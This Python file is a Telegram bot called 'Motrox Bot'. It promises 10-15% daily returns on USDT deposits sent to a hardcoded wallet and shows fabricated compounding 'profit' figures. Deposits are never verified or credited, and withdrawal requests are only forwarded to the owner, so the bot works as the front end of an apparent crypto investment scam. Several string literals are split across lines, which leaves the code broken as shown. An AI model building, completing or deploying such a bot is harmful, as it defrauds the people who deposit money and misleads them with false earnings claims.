import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime

users = {}
OWNER_ID = 123456789  # Replace with your Telegram ID
USDT_ADDRESS = "TTP45gJWhuo6Axe8jYqc1hBc2f8zMyS5Ki"

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in users:
        users[user_id] = {"balance": 0, "start_time": None, "usdt_address": None}
    keyboard = [
        [InlineKeyboardButton("💸 Deposit", callback_data='deposit')],
        [InlineKeyboardButton("📈 Progress", callback_data='progress')],
        [InlineKeyboardButton("🏦 Balance", callback_data='balance')],
        [InlineKeyboardButton("💵 Withdraw", callback_data='withdraw')],
        [InlineKeyboardButton("❓ What we do?", callback_data='info')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"👋 Welcome to *Motrox Bot!*"

Invest USDT (TRC20) and earn 10%-15% daily passive income. "
        "We calculate profits every 2 hours (0.8%).",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    if query.data == 'deposit':
        users[user_id]['start_time'] = datetime.now()
        await query.edit_message_text(f"Send your USDT TRC20 to:
`{USDT_ADDRESS}`", parse_mode='Markdown')
    elif query.data == 'progress':
        if users[user_id]['start_time']:
            hours = (datetime.now() - users[user_id]['start_time']).total_seconds() // 7200
            profit = users[user_id]['balance'] * (1 + 0.008) ** hours
            await query.edit_message_text(f"⏱ You earned approximately *{profit:.2f} USDT* so far.", parse_mode='Markdown')
        else:
            await query.edit_message_text("You haven't made a deposit yet.")
    elif query.data == 'balance':
        if users[user_id]['start_time']:
            hours = (datetime.now() - users[user_id]['start_time']).total_seconds() // 7200
            profit = users[user_id]['balance'] * (1 + 0.008) ** hours
            await query.edit_message_text(f"💰 Your current balance is *{profit:.2f} USDT*.", parse_mode='Markdown')
        else:
            await query.edit_message_text("💰 Your balance is *0 USDT*.", parse_mode='Markdown')
    elif query.data == 'withdraw':
        await query.edit_message_text("💸 Please send me your *USDT TRC20 wallet address* to withdraw your profits.", parse_mode='Markdown')
        context.user_data['awaiting_withdraw_address'] = True
    elif query.data == 'info':
        await query.edit_message_text(
            "📊 *What We Do?*

Motrox is a smart investment platform. "
            "Deposit USDT (TRC20), and we generate 10-15% profit daily. "
            "Your funds are managed through automated systems and the profit is updated every 2 hours (0.8%).",
            parse_mode='Markdown'
        )

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    if context.user_data.get('awaiting_withdraw_address'):
        context.user_data['awaiting_withdraw_address'] = False
        users[user_id]['usdt_address'] = text
        await update.message.reply_text("✅ Withdrawal request sent to admin.")
        await context.bot.send_message(chat_id=OWNER_ID, text=f"📤 Withdraw request:
User: {user_id}
Wallet: {text}")
    else:
        await update.message.reply_text("❓ Use the menu buttons to interact.")

if __name__ == "__main__":
    import asyncio
    async def main():
        app = ApplicationBuilder().token("YOUR_BOT_TOKEN").build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(button_handler))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
        print("🤖 Bot running...")
        await app.run_polling()
    asyncio.run(main())
